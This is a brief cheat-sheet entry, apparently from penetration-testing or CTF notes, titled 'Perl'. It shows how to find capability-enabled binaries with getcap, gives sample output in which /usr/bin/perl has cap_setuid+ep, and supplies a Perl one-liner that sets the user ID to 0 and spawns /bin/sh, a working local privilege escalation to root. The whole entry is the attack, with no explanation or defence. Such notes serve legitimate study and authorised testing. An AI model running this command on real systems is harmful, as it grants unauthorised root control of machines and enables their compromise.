# Perl

```
getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
